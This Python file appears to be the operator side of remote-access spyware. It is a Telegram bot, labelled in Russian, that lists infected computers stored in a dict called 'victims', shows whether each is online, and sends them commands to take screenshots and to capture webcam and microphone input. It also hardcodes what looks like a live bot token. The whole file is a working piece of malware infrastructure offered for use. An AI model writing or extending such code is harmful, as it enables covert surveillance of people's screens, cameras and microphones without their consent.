import telebot
from telebot import types
import time

# ТВОЙ ТОКЕН
bot = telebot.TeleBot("8610879721:AAFGQvJIBJXbKvASlRsEzNAiu1ga3I5TdhI")

victims = {}

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    now = time.time()
    for worker_id, last_seen in victims.items():
        status = "🟢" if (now - last_seen) < 120 else "🔴"
        button_text = f"{status} {worker_id}"
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"manage_{worker_id}"))
    markup.add(types.InlineKeyboardButton("🔄 Обновить список", callback_data="refresh"))
    return markup

def get_commands_keyboard(worker_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📸 Скриншот", callback_data=f"cmd_screen_{worker_id}"),
        types.InlineKeyboardButton("📷 Веб-камера", callback_data=f"cmd_cam_{worker_id}"),
        types.InlineKeyboardButton("🎙 Микрофон", callback_data=f"cmd_listen_{worker_id}"),
        types.InlineKeyboardButton("🔙 Назад", callback_data="refresh")
    )
    return markup

@bot.message_handler(commands=['start', 'panel'])
def show_panel(m):
    bot.send_message(m.chat.id, "💻 Панель управления (24/7 Server):", reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda m: "в сети" in m.text)
def update_status(m):
    try:
        worker_id = m.text.split("`")[1]
        victims[worker_id] = time.time()
    except:
        pass

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data == "refresh":
        bot.edit_message_text("💻 Список устройств обновлен:", call.message.chat.id, call.message.message_id, reply_markup=get_main_keyboard())
    elif call.data.startswith("manage_"):
        worker_id = call.data.replace("manage_", "")
        bot.edit_message_text(f"🎮 Управление ПК: {worker_id}", call.message.chat.id, call.message.message_id, reply_markup=get_commands_keyboard(worker_id))
    elif call.data.startswith("cmd_"):
        data = call.data.split("_")
        bot.send_message(call.message.chat.id, f"/{data[1]} {data[2]}")
        bot.answer_callback_query(call.id, "Команда отправлена!")

bot.polling(none_stop=True)
